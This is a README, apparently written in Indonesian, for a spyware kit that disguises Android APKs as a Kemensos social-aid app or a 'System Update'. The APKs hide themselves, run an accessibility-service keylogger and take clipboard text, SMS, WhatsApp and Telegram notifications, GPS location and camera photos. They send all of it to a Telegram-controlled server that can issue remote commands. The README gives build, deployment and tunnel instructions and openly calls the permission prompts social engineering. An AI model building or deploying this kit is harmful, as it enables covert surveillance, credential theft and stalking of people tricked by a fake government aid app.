# Bansos Tracker — GPS Monitoring System

**Sistem Monitoring Terpadu** — Telegram Bot + Android APK (A11Y Keylogger) + Web Dashboard Premium  
*v4.0 — Keylog · Clipboard · App Tracking · Remote Command*

---

## 📋 Daftar Isi

- [🚀 Quick Start](#-quick-start)
- [🗂️ Struktur File](#️-struktur-file)
- [🐍 Backend — Flask + Telegram Bot](#-backend--flask--telegram-bot)
  - [Environment Variables](#environment-variables)
  - [API Endpoints](#api-endpoints)
  - [Bot Commands](#bot-commands)
- [📱 Android APK — BansosService (Stealth)](#-android-apk--bansosservice-stealth)
  - [Fitur v4.0](#fitur-v40)
  - [File Struktur APK](#file-struktur-apk)
  - [Build APK](#build-apk)
  - [Cara Kerja](#cara-kerja)
- [📱 Android APK — BansosApp (WebView)](#-android-apk--bansosapp-webview)
- [🖥️ Dashboard Monitoring](#️-dashboard-monitoring)
- [🌐 Cloudflare Tunnel](#-cloudflare-tunnel)
- [🔧 VPS Migration Guide](#-vps-migration-guide)
- [⚡ Quick Reference](#-quick-reference)

---

## 🚀 Quick Start

```bash
# 1. Clone
git clone https://github.com/clickmamaheti-prog/bansos-tracker.git
cd bansos-tracker

# 2. Install Python dependencies
pip3 install flask python-telegram-bot requests

# 3. Set environment
export BOT_TOKEN="<token_dari_botfather>"
export BASE_URL="https://domain-anda.com"

# 4. Jalankan
python3 bot.py
```

Buka `http://localhost:5000` → landing page.  
Dashboard admin: `http://localhost:5000/admin/dashboard`

---

## 🗂️ Struktur File

```
bansos-tracker/
├── bot.py                          # 🐍 Main Flask application + Telegram bot
├── start.sh                        # Auto-start script (Cloudflare Tunnel + Bot)
├── .gitignore
├── README.md
│
├── templates/                      # 🌐 Web pages (mobile-first, 320px+)
│   ├── index.html                  #   Landing page (premium gov-style)
│   ├── dashboard.html              #   Dashboard monitoring v4.0 (glassmorphism + SVG)
│   ├── track.html                  #   Target tracking page
│   ├── map.html                    #   Google Maps page
│   └── error.html                  #   Error page
│
├── static/                         # 🖼️ Assets
│   ├── icons.svg                   #   20+ premium SVG icons for dashboard
│   ├── favicon.svg                 #   Logo Kemensos Hadir (SVG)
│   ├── favicon.ico
│   └── favicon-*.png
│
├── android/                        # 📱 Android APK source
│   ├── build-apk.sh                #   Shared build script
│   │
│   ├── BansosApp/                  #   📱 WebView tracker version
│   │   ├── build-apk.sh
│   │   └── app/src/main/
│   │       ├── AndroidManifest.xml
│   │       ├── java/com/kemensos/bansos/
│   │       │   ├── MainActivity.java
│   │       │   ├── SmsReceiver.java
│   │       │   └── NotifListener.java
│   │       └── res/
│   │
│   └── BansosService/              #   🕵️ Stealth background version (v4.0)
│       ├── build-apk.sh
│       └── app/src/main/
│           ├── AndroidManifest.xml
│           ├── java/com/kemensos/bansos/
│           │   ├── MainActivity.java
│           │   ├── UpdateService.java
│           │   ├── KeylogService.java        # ★ NEW v4.0
│           │   ├── SmsReceiver.java
│           │   └── NotifService.java
│           └── res/
│               ├── values/strings.xml
│               └── xml/
│                   └── accessibility_service_config.xml  # ★ NEW v4.0
│
└── downloads/                      # 📦 APK build output
    └── bantuan-sosial-v4.0.apk
```

---

## 🐍 Backend — Flask + Telegram Bot

### Environment Variables

| Variable | Wajib? | Deskripsi | Contoh |
|----------|--------|-----------|--------|
| `BOT_TOKEN` | ✅ Ya | Token Telegram Bot dari @BotFather | `8813008108:AAFTaDai5Cm5...` |
| `BASE_URL` | ✅ Ya | URL publik (Cloudflare Tunnel / domain) | `https://bansos.jokichannel.eu.org` |

### Cara Dapat Token

1. Buka [@BotFather](https://t.me/BotFather) di Telegram  
2. Kirim `/newbot`, ikuti instruksi  
3. Copy token → `export BOT_TOKEN="token_anda"`

### Jalankan

```bash
python3 bot.py
# atau via start.sh:
bash start.sh
```

Bot akan:
- Listen di **port 5000** (Flask web server)
- Polling Telegram untuk perintah bot
- Serve landing page + dashboard + API
- Keep web server alive meskipun Telegram polling error

### API Endpoints

| Endpoint | Method | Deskripsi |
|----------|--------|-----------|
| `/` | GET | Landing page |
| `/admin/dashboard` | GET | Dashboard monitoring (HTML) |
| `/admin/dashboard/json` | GET | Dashboard data (JSON) — auto-refresh |
| `/admin/dashboard/events-json` | GET | Location events (JSON) |
| `/download/apk` | GET | Download APK v4.0 |
| `/api/apk-version` | GET | APK version info (JSON) |
| `/api/location/<tid>` | POST | Receive GPS location from target |
| `/api/photo/<tid>` | POST | Receive photo from target |
| `/api/sms/<tid>` | POST | Receive SMS from target |
| `/api/notif/<tid>` | POST | Receive notification from target |
| `/api/keylog/<did>` | POST | Receive keylog data (NEW v4.0) |
| `/api/keylog/<did>` | GET | Get keylog data (NEW v4.0) |
| `/api/clipboard/<did>` | POST | Receive clipboard data (NEW v4.0) |
| `/api/clipboard/<did>` | GET | Get clipboard data (NEW v4.0) |
| `/api/app-usage/<did>` | POST | Receive app usage data (NEW v4.0) |
| `/api/app-usage/<did>` | GET | Get app usage data (NEW v4.0) |
| `/api/commands/<did>` | GET | Get pending commands (NEW v4.0) |
| `/api/commands/<did>/add` | POST | Add remote command (NEW v4.0) |
| `/api/commands/<did>/<cmd_id>` | POST | Mark command executed (NEW v4.0) |
| `/api/device/<did>` | GET | Get device info (NEW v4.0) |
| `/api/device/<did>` | POST | Register/update device (NEW v4.0) |
| `/api/upload/screenshot/<did>` | POST | Upload screenshot (NEW v4.0) |
| `/<tid>` | GET | Tracking page for target |

### Bot Commands

| Command | Deskripsi |
|---------|-----------|
| `/start` | Menu utama + daftar link tracking |
| `/help` | Bantuan |
| `/links` | Daftar semua link tracking |
| `/map <id>` | Lihat lokasi di peta |
| `/keylog <device_id>` | Lihat keylog terbaru dari perangkat |
| `/clip <device_id>` | Lihat clipboard history perangkat |
| `/apps <device_id>` | Lihat aktivitas aplikasi perangkat |
| `/devices` | Daftar semua perangkat terhubung |
| `/cmd <device_id> <command>` | Kirim perintah remote ke perangkat |
| `/apkversion` | Cek versi APK terbaru |
| `/data <device_id>` | Dapatkan semua data perangkat dalam PDF/JSON |

### Database Tables (SQLite — `tracker.db`)

| Table | Fungsi |
|-------|--------|
| `tracking_links` | Link tracking (ID unik per target) |
| `tracking_events` | GPS location events |
| `tracking_photos` | Photo captures from target camera |
| `tracking_sms` | SMS captured from target |
| `tracking_notif` | Notifications from WA/Telegram/etc |
| `keylog_entries` | ★ Keylog data (NEW v4.0) |
| `clipboard_history` | ★ Clipboard captures (NEW v4.0) |
| `app_usage_log` | ★ App switch timeline (NEW v4.0) |
| `devices` | ★ Device status & counters (NEW v4.0) |
| `pending_commands` | ★ Remote command queue (NEW v4.0) |
| `screenshots` | ★ Screenshot captures (NEW v4.0) |

---

## 📱 Android APK — BansosService (Stealth)

APK stealth — tanpa icon di launcher, tanpa WebView, langsung minta izin, jalan di background.

**Package name:** `com.kemensos.bansos`  
**Nama tampilan:** "Pembaruan Sistem"  
**Target SDK:** Android 13 (API 33)

### Fitur v4.0

| Fitur | Detail |
|-------|--------|
| 🎭 **Stealth** | Transparent activity → ilang 1 detik, no launcher icon |
| ⌨️ **Keylogger A11Y** | Tangkap semua input keyboard via Accessibility Service |
| 📋 **Clipboard Monitor** | Capture teks yang di-copy pengguna |
| 📱 **App Tracking** | Riwayat switch aplikasi (package name + class) |
| 📍 **GPS** | Lokasi real-time tiap interval |
| 📸 **Kamera** | Foto otomatis dari kamera depan |
| 📨 **SMS** | SMS masuk otomatis via BroadcastReceiver |
| 💬 **Notifikasi** | WA/Telegram/Messenger via NotificationListener |
| 📟 **Remote Command** | Polling command dari server (capture photo, set interval, self destruct) |
| 🛡️ **Stealth** | Ignore battery optimization, START_STICKY, notif sistem samar |
| ✅ **Izin Minimal** | Hanya butuh 3 izin + overlay (no suspicious permissions) |

### File Struktur APK

| File | Fungsi |
|------|--------|
| `AndroidManifest.xml` | BIND_ACCESSIBILITY_SERVICE, transparent activity alias, v4.0 permissions |
| `MainActivity.java` | Aliran izin bertahap + enable A11Y + first-run stealth |
| `UpdateService.java` | Foreground service: GPS, kamera, upload, remote command polling |
| `KeylogService.java` | ★ NEW — AccessibilityService: keylog + clipboard + app tracking + command poll |
| `SmsReceiver.java` | BroadcastReceiver — tangkap SMS masuk |
| `NotifListener.java` | NotificationListenerService — tangkap WA/TG/Messenger |
| `accessibility_service_config.xml` | ★ NEW — XML config untuk A11Y service (social engineering description) |
| `strings.xml` | String resources (nama app, deskripsi A11Y) |

### File Key: KeylogService.java

```
KeylogService extends AccessibilityService
├── onAccessibilityEvent(event)
│   ├── TYPE_VIEW_TEXT_CHANGED → log text input + package name
│   ├── TYPE_VIEW_TEXT_SELECTION_CHANGED → clipboard capture
│   └── TYPE_WINDOW_STATE_CHANGED → app switch tracking
├── onInterrupt() → flush buffer
├── Auto-flush timer (3 detik) → kirim ke server via HTTP POST
└── Command polling (tiap 15 detik) → GET /api/commands/{device_id}
```

### Build APK

**Requirements:** `aapt`, `d8` (Android build tools), `apksigner`, `zipalign`

```bash
cd android/BansosService
bash build-apk.sh
```

Output: `downloads/bantuan-sosial-v4.0.apk`

Build process:
1. `aapt2` compile resources → link → `unaligned.apk`
2. `d8` compile Java → classes.dex
3. Add classes.dex to APK
4. `zipalign` + `apksigner` with test key → signed APK

### Cara Kerja

**Aliran Izin:**
1. `MainActivity` muncul di layar (activity transparan, duration < 1 detik)
2. Minta izin: `ACCESS_FINE_LOCATION` → `CAMERA` → `READ_SMS` → `POST_NOTIFICATIONS`
3. Buka halaman **Aksesibilitas** Settings → minta enable "Pembaruan Sistem"
4. Activity selesai, APK jalan di background
5. `UpdateService` mengelola foreground service + GPS + kamera
6. `KeylogService` mengelola A11Y keylogger + clipboard + app tracking

**Pengiriman Data:**
- Semua data dikirim ke `BASE_URL/api/...` via HTTP POST
- Keylog auto-flush setiap 3 detik (buffer → HTTP → clear)
- GPS & kamera sesuai interval (default 60s / 30s)

**Catatan Penting:**
- Android 12+ akan muncul **green dot** di status bar saat kamera aktif
- Izin **Akses Notifikasi** harus manual: Settings → Apps → Pembaruan Sistem
- Google Play Protect mungkin mendeteksi APK yang tidak ditandatangani dengan key yang dikenal

---

## 📱 Android APK — BansosApp (WebView)

APK yang menampilkan halaman tracker di WebView + background collection.

**Lokasi:** `android/BansosApp/`

**Fitur:**

| File | Fungsi |
|------|--------|
| `MainActivity.java` | WebView tracker + kamera/lokasi/SMS permissions |
| `SmsReceiver.java` | 📨 BroadcastReceiver — tangkap SMS masuk |
| `NotifListener.java` | 💬 NotificationListenerService — tangkap WA/Telegram |

**Build:**

```bash
cd android/BansosApp
bash build-apk.sh
```

**Aktifkan Notif WA di HP Target:**
1. Buka **Settings → Apps → Akses Notifikasi**
2. Cari **"Cek Bantuan Sosial"**
3. Aktifkan toggle ✅

---

## 🖥️ Dashboard Monitoring

**Akses:** `{BASE_URL}/admin/dashboard`  
**JSON API:** `{BASE_URL}/admin/dashboard/json` (auto-refresh tiap 12 detik)

### Tampilan

| Section | Data yang Ditampilkan |
|---------|-----------------------|
| **Stats Bar** | 8 kartu statistik: Links, Lokasi, SMS, Notif, Keylog, Clipboard, Devices, Aktivitas |
| **Perangkat** | Cards perangkat: status online/offline, count (keylog, clip, apps, notif, SMS) |
| **Keyboard** | Hasil keylogger — text, package app, timestamp, char count |
| **Clipboard** | Clipboard captures — text yang di-copy, source app |
| **Aktivitas Aplikasi** | Timeline switch aplikasi — package, class, timestamp |
| **Notifikasi** | WhatsApp (badge hijau), Telegram (badge biru), Messenger, SMS |
| **SMS** | SMS masuk dari perangkat target |
| **Konsol Perintah** | Kirim remote command + lihat antrean pending |
| **Tautan** | Daftar link tracking + status aktif/nonaktif |
| **Lokasi** | Riwayat event GPS (lat, lng, akurasi) |

### Fitur Dashboard

- **20+ SVG icons** — Zero emoji, semua icon government-style detail
- **Glassmorphism** — backdrop-filter blur, semi-transparan
- **Kemensos Branding** — Biru #0055A4, Hijau #00A550, Emas #FFCC00
- **Filter Chips** — Filter section: Semua, Perangkat, Keyboard, Clipboard, Aplikasi, Pesan, Perintah
- **Auto Live Refresh** — Update data tiap 12 detik, live badge indicator
- **Mobile-first** — Responsive 320px+, touch-friendly, safe-area-inset
- **Command Console** — Kirim perintah dari browser: `CAPTURE_PHOTO`, `GET_LOCATION`, `SET_INTERVAL`, `PING`, `SEND_NOTIFICATION`, `OPEN_URL`, `SELF_DESTRUCT`
- **Bottom Navigation** — Dashboard, Perangkat, Beranda, Keyboard, Reload

---

## 🌐 Cloudflare Tunnel

Menggantikan ngrok — domain **permanen**, SSL otomatis, 1x build APK selamanya.

### Setup

```bash
# Install cloudflared
# Login & create tunnel
cloudflared tunnel create bansos-tracker

# Konfigurasi ~/.cloudflared/config.yml
tunnel: <tunnel-id>
credentials-file: /root/.cloudflared/<tunnel-id>.json
ingress:
  - hostname: bansos.domain.com
    service: http://localhost:5000
  - service: http_status:404

# DNS record
cloudflared tunnel route dns bansos-tracker bansos.domain.com

# Run
cloudflared tunnel run
```

### Auto-start via `start.sh`

```bash
cloudflared tunnel --config /root/.cloudflared/config.yml \
  --credentials-file /root/.cloudflared/<id>.json run &
sleep 3
python3 bot.py
```

Domain aktif: **`bansos.jokichannel.eu.org`**

---

## 🔧 VPS Migration Guide

Backup dan restore penuh tanpa rebuild dari nol.

### Backup (VPS Lama)

```bash
# 1. Backup database + data bot
tar -czf bansos-tracker-backup.tar.gz \
  /root/gps-link/tracker.db \
  /root/gps-link/bot.py \
  /root/gps-link/templates/ \
  /root/gps-link/static/ \
  /root/gps-link/start.sh \
  /root/gps-link/android/ \
  /root/gps-link/downloads/ \
  /root/.cloudflared/

# 2. Copy ke VPS baru
scp bansos-tracker-backup.tar.gz root@<vps-baru-ip>:~/
```

### Restore (VPS Baru)

```bash
# 1. Extract
tar -xzf bansos-tracker-backup.tar.gz -C /

# 2. Install deps
apt install python3-pip cloudflared -y
pip3 install flask python-telegram-bot requests

# 3. Restart cloudflared tunnel
cloudflared tunnel --config /root/.cloudflared/config.yml run &

# 4. Start bot
cd /root/gps-link && bash start.sh
```

**Catatan:** Jika ada perubahan IP, update DNS Cloudflare Tunnel.  
**File kritis:** `tracker.db` (semua data bot), `start.sh` (BOT_TOKEN), `.cloudflared/` (credentials tunnel)

---

## ⚡ Quick Reference

```bash
# Start
cd /root/gps-link && bash start.sh

# Start with environment
BOT_TOKEN="xxx" BASE_URL="https://domain.com" python3 bot.py

# Kill
pkill -f "python3 bot.py"

# Cloudflare tunnel
cloudflared tunnel --config /root/.cloudflared/config.yml run

# Build APK BansosService (stealth v4.0)
cd /root/gps-link/android/BansosService && bash build-apk.sh

# Build APK BansosApp (WebView)
cd /root/gps-link/android/BansosApp && bash build-apk.sh

# Reset database
rm -f /root/gps-link/tracker.db

# Check status
curl -s http://localhost:5000/admin/dashboard/json | python3 -m json.tool
```

---

> **Dibuat oleh DevCultur © 2026**  
> Domain: `bansos.jokichannel.eu.org`  
> Repository: `github.com/clickmamaheti-prog/bansos-tracker`
